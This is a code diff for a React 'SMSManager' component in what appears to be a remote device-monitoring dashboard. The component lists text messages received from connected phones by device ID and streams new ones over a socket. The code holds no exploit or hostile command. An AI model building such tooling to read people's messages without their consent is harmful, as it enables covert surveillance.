@@ -1,6 +1,7 @@
 import React, { useEffect, useState, useRef } from "react";
 import { useTranslation } from "react-i18next";
 import { useMediaQuery } from "react-responsive";
+import toast from "react-hot-toast";
 
 import {
   Grid,
@@ -12,27 +13,27 @@ import {
   IconButton,
 } from "@mui/material";
 
-import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
-import { useSocketFunctions } from "src/utils/socket";
 import { useSocket } from "../../hooks/use-socket";
 import MonitorViewer from "../monitorViewer";
 
+import { formatDateTime } from "src/utils/common";
+import { getMessageList, getAllSMSByPhoneNumber } from "src/store/actions/sms.action";
+
 import SendIcon from "@mui/icons-material/Send";
+import SmsIcon from "@mui/icons-material/Sms";
+import HourglassEmptyIcon from "@mui/icons-material/HourglassEmpty";
 
 import Color from "src/theme/colors";
 
 const SMSManager = ({ label, device, onClose }) => {
   const { t } = useTranslation();
   const { socket } = useSocket();
-  const { onSocketManager, onGetGalleryEvent } = useSocketFunctions();
 
   const isTablet = useMediaQuery({ query: "(max-width: 1024px) and (min-width: 476px)" });
 
-  const [galleryData, setGalleryData] = useState([]);
-  const [selectedMessages, setSelectedMessages] = useState(null);
-
-  const [inputMessage, setInputMessage] = useState("");
-  const chatContainerRef = useRef(null);
+  const [smsList, setSMSList] = useState([]);
+  const [selectedSMS, setSelectedSMS] = useState([]);
+  const [allMessages, setAllMessages] = useState([]);
 
   const [state, setState] = useState({
     width: isTablet ? 500 : 800,
@@ -76,42 +77,146 @@ const SMSManager = ({ label, device, onClose }) => {
 
   const init = async () => {
     try {
-      console.log("get messages");
+      const deviceId = device?.deviceId;
+      const response = await getMessageList(deviceId);
+      if (response && Array.isArray(response)) {
+        setSMSList(response);
+      }
+
+      socket.on(`sms-manager-shared-${deviceId}`, onAllSMSResponse);
     } catch (error) {
-      console.log("get gallery error:", error);
+      toast.error(t("toast.error.server-error"), {
+        position: "bottom-center",
+        reverseOrder: false,
+        duration: 5000,
+        style: {
+          backgroundColor: Color.background.red_gray01,
+          borderRadius: "5px",
+          padding: "3px 10px",
+        },
+      });
     }
   };
 
-  const handleSendMessage = () => {
-    if (inputMessage.trim() === "") return;
+  const onAllSMSResponse = (data) => {
+    // Check if the incoming message is from the current device
+    if (device?.deviceId === data?.response?.deviceId) {
+      // If it's a new phone number, add a new SMS entry to the top of the list and show toast
+      toast.success(`${t("toast.success.add-new-sms")} ${data?.response?.phonenumber} `, {
+        position: "bottom-right",
+        reverseOrder: false,
+        duration: 5000,
+        style: {
+          border: `solid 1px ${Color.background.purple}`,
+          backgroundColor: Color.background.purple_opacity,
+          color: Color.text.primary,
+          borderRadius: "0px",
+          padding: "2px 10px",
+          fontSize: "16px",
+        },
+      });
 
-    const newMessage = {
-      id: messages.length + 1,
-      text: inputMessage,
-      sender: "user",
-      timestamp: new Date().toLocaleTimeString(),
-    };
-    setMessages((prevMessages) => [...prevMessages, newMessage]);
-    setInputMessage("");
-    scrollToBottom();
+      setSMSList((prevSMSList) => {
+        // Find if the SMS phone number already exists in the list
+        const existingSMSIndex = prevSMSList.findIndex(
+          (sms) => sms.phoneNumber === data.response.phonenumber
+        );
+
+        // If the phone number exists, update the last message and flag it as new
+        if (existingSMSIndex >= 0) {
+          const updatedSMSList = [...prevSMSList];
+          updatedSMSList[existingSMSIndex] = {
+            ...updatedSMSList[existingSMSIndex],
+            hasNewMessage: true,
+            lastMessage: data.response.message,
+          };
+
+          // Bring the updated message to the top of the list by reordering
+          const [updatedSMS] = updatedSMSList.splice(existingSMSIndex, 1);
+          updatedSMSList.unshift(updatedSMS);
+
+          // Update the `allMessages` state if the incoming SMS belongs to the currently selected conversation
+          setAllMessages((prevAllMessages) => {
+            // Check if the selected SMS matches the incoming message's phone number
+            if (selectedSMS?.phoneNumber === data.response.phonenumber) {
+              return [
+                {
+                  phoneNumber: data.response.phonenumber,
+                  message: data.response.message,
+                  createdAt: new Date(),
+                },
+                ...prevAllMessages, // Keep old messages intact
+              ];
+            }
+            return prevAllMessages; // No changes if the message doesn't belong to the current conversation
+          });
+
+          return updatedSMSList;
+        }
+
+        // Add new SMS to `allMessages` if it's the current conversation
+        setAllMessages((prevAllMessages) => {
+          if (selectedSMS?.phoneNumber === data.response.phonenumber) {
+            return [
+              {
+                phoneNumber: data.response.phonenumber,
+                message: data.response.message,
+                createdAt: new Date(),
+              },
+              ...prevAllMessages,
+            ];
+          }
+          return prevAllMessages;
+        });
+
+        return [
+          {
+            phoneNumber: data.response.phonenumber,
+            lastMessage: data.response.message,
+            createdAt: new Date(),
+            hasNewMessage: true,
+            deviceId: data.response.deviceId,
+          },
+          ...prevSMSList,
+        ];
+      });
+    }
+  };
+
+  const onSelectSMS = async (sms) => {
+    setSelectedSMS(sms);
+    try {
+      const deviceId = sms?.deviceId;
+      const phoneNumber = sms?.phoneNumber;
+
+      const response = await getAllSMSByPhoneNumber({ deviceId, phoneNumber });
+      if (response.success == true) {
+        setAllMessages(response.allSms);
+
+        // Remove the new message badge when the user selects the SMS
+        setSMSList((prevSMSList) =>
+          prevSMSList.map((item) =>
+            item.phoneNumber === phoneNumber ? { ...item, hasNewMessage: false } : item
+          )
+        );
+      }
+    } catch (error) {
+      toast.error(t("toast.error.server-error"), {
+        position: "bottom-center",
+        reverseOrder: false,
+        duration: 5000,
+        style: {
+          backgroundColor: Color.background.red_gray01,
+          borderRadius: "5px",
+          padding: "3px 10px",
+        },
+      });
+    }
   };
 
   const onCloseModal = async () => {
-    try {
-      onClose(false);
-    } catch (error) {
-      console.log("close monitor modal error", error);
-    }
+    onClose(false);
   };
-
-  const [messages, setMessages] = useState([
-    { id: 1, text: "Hello, how are you?", sender: "user", timestamp: "10:30 AM" },
-    { id: 2, text: "I'm fine, thanks! What about you?", sender: "robot", timestamp: "10:31 AM" },
-  ]);
-
-  // Dummy user info for avatars
-  const userAvatar = "/path/to/user-avatar.jpg";
-  const robotAvatar = "/path/to/robot-avatar.jpg";
 
   return (
     <MonitorViewer initialState={state} onClose={onCloseModal}>
@@ -132,39 +237,87 @@ const SMSManager = ({ label, device, onClose }) => {
               overflowY: "auto",
               border: `solid 1px ${Color.background.border}`,
               borderRadius: "5px",
+              padding: "10px 5px",
+              height: "100%",
             }}
           >
-            <div style={{ backgroundColor: Color.background.main }}>
-              {galleryData.length === 0 ? (
-                <Typography style={{ color: "white" }}>
-                  {t("devicesPage.managers.gallery-noimage")}
-                </Typography>
+            <div style={{ backgroundColor: Color.background.main, height: "100%" }}>
+              {smsList?.length === 0 ? (
+                <Box
+                  sx={{
+                    height: "100%",
+                    display: "flex",
+                    flexDirection: "column",
+                    justifyContent: "center",
+                    alignItems: "center",
+                  }}
+                >
+                  <Typography style={{ color: Color.text.secondary }}>
+                    {t("devicesPage.managers.sms-list-empty")}
+                  </Typography>
+                </Box>
               ) : (
-                galleryData.map((image, index) => (
-                  <Typography
+                smsList?.map((smslist, index) => (
+                  <Box
                     key={index}
-                    onClick={() => onSelectImage(image)}
-                    style={{
+                    onClick={() => onSelectSMS(smslist)}
+                    sx={{
                       cursor: "pointer",
-                      marginBottom: "8px",
-                      color: selectedImageId === image.imageId ? Color.text.purple : "white",
-                      padding: "5px 10px",
-                      borderRadius: "5px",
-                      transition: "background-color 0.3s",
-                    }}
-                    onMouseEnter={(e) => {
-                      if (!selectedImage || selectedImage.imageId !== image.imageId) {
-                        e.currentTarget.style.backgroundColor = Color.background.purple_opacity;
-                      }
-                    }}
-                    onMouseLeave={(e) => {
-                      if (!selectedImage || selectedImage.imageId !== image.imageId) {
-                        e.currentTarget.style.backgroundColor = "transparent";
-                      }
+                      marginBottom: "2px",
+                      color: Color.text.primary,
+                      border: `solid 1px ${
+                        selectedSMS?._id === smslist?._id
+                          ? Color.text.purple
+                          : Color.background.main
+                      }`,
+                      backgroundColor:
+                        selectedSMS?._id === smslist?._id
+                          ? Color.background.purple_opacity
+                          : "initial",
+                      padding: "5px",
+                      transition: "background-color 0.1s",
+                      "&:hover": {
+                        backgroundColor: Color.background.purple_opacity,
+                      },
                     }}
                   >
-                    {image.filepath.split("/").pop()}
-                  </Typography>
+                    <Box sx={{ width: "100%" }}>
+                      <Box sx={{ display: "flex", justifyContent: "space-between" }}>
+                        <Typography sx={{ fontSize: "16px" }}>{smslist?.phoneNumber}</Typography>
+                        {smslist.hasNewMessage && (
+                          <Box>
+                            <Typography
+                              sx={{
+                                backgroundColor: Color.background.green,
+                                color: Color.text.purple,
+                                mt: "2px",
+                                px: "5px",
+                                py: "0px",
+                                fontSize: "10px",
+                                borderRadius: "3px",
+                              }}
+                            >
+                              New
+                            </Typography>
+                          </Box>
+                        )}
+                      </Box>
+
+                      <Typography
+                        sx={{
+                          fontSize: "14px",
+                          color: Color.text.secondary,
+                          width: "100px",
+                          overflow: "hidden",
+                          whiteSpace: "nowrap",
+                          textOverflow: "ellipsis",
+                          pl: 1,
+                        }}
+                      >
+                        {smslist?.lastMessage}
+                      </Typography>
+                    </Box>
+                  </Box>
                 ))
               )}
             </div>
@@ -181,7 +334,7 @@ const SMSManager = ({ label, device, onClose }) => {
               borderRadius: "5px",
             }}
           >
-            {!selectedMessages ? (
+            {allMessages ? (
               <div
                 style={{
                   display: "flex",
@@ -194,7 +347,6 @@ const SMSManager = ({ label, device, onClose }) => {
               >
                 {/* Chat Messages Area */}
                 <Box
-                  ref={chatContainerRef}
                   sx={{
                     flex: 1,
                     padding: "10px",
@@ -204,98 +356,48 @@ const SMSManager = ({ label, device, onClose }) => {
                     width: "100%",
                   }}
                 >
-                  {messages.map((message) => (
+                  {allMessages?.map((message, index) => (
                     <Box
-                      key={message.id}
+                      key={index}
                       sx={{
                         display: "flex",
                         alignItems: "flex-end",
-                        justifyContent: message.sender === "user" ? "flex-end" : "flex-start",
+                        justifyContent: "flex-start",
                         marginBottom: "15px",
                       }}
                     >
-                      {message.sender === "robot" && (
-                        <Avatar
-                          src={robotAvatar}
-                          sx={{ width: 35, height: 35, marginRight: "10px" }}
-                        />
-                      )}
                       <Box
                         sx={{
-                          backgroundColor:
-                            message.sender === "user"
-                              ? Color.background.purple_opacity01
-                              : Color.background.main_gray01,
+                          backgroundColor: Color.background.purple_opacity01,
                           padding: "10px 15px",
-                          border: `solid 1px ${
-                            message.sender == "user"
-                              ? Color.background.purple_opacity01
-                              : Color.background.purple
-                          }`,
-                          borderTopLeftRadius: "10px",
+                          border: `solid 1px ${Color.background.purple_opacity01}`,
+                          borderTopLeftRadius: "0px",
                           borderTopRightRadius: "10px",
+                          borderBottomRightRadius: "10px",
                           borderBottomLeftRadius: "10px",
                           color: "white",
                           maxWidth: "60%",
-                          textAlign: message.sender === "user" ? "right" : "left",
                         }}
                       >
-                        <Typography variant="body2">{message.text}</Typography>
-                        <Typography variant="caption" sx={{ fontSize: "0.8rem", color: "gray" }}>
-                          {message.timestamp}
+                        <Typography sx={{ fontSize: "18px", textAlign: "left" }}>
+                          {message.message}
+                        </Typography>
+                        <Typography
+                          sx={{
+                            width: "100%",
+                            fontSize: "10px",
+                            color: Color.text.secondary,
+                            textAlign: "right",
+                          }}
+                        >
+                          {formatDateTime(message.created_at)}
                         </Typography>
                       </Box>
-                      {message.sender === "user" && (
-                        <Avatar
-                          src={userAvatar}
-                          sx={{ width: 35, height: 35, marginLeft: "10px" }}
-                        />
-                      )}
                     </Box>
                   ))}
                 </Box>
 
                 {/* Message Input Area */}
-                <Box
-                  sx={{
-                    width: "100%",
-                    display: "flex",
-                    padding: "10px",
-                    borderTop: `1px solid ${Color.background.border}`,
-                    backgroundColor: Color.background.main,
-                  }}
-                >
-                  <TextField
-                    className="screen-message"
-                    fullWidth
-                    placeholder={t("Type a message...")}
-                    value={inputMessage}
-                    onChange={(e) => setInputMessage(e.target.value)}
-                    inputProps={{
-                      style: {
-                        backgroundColor: Color.background.main,
-                        padding: "10px 50px 10px 10px",
-                      },
-                    }}
-                  />
-
-                  <IconButton
-                    onClick={handleSendMessage}
-                    variant="contained"
-                    sx={{
-                      marginLeft: "10px",
-                      borderRadius: "50%",
-                      padding: "10px",
-                      color: Color.text.primary,
-                      backgroundColor: Color.background.purple,
-                      "&:hover": {
-                        backgroundColor: Color.background.purple_light,
-                      },
-                    }}
-                  >
-                    <SendIcon />
-                  </IconButton>
-                </Box>
               </div>
             ) : (
               <Typography sx={{ fontSize: "14px", textAlign: "center", color: "white" }}>
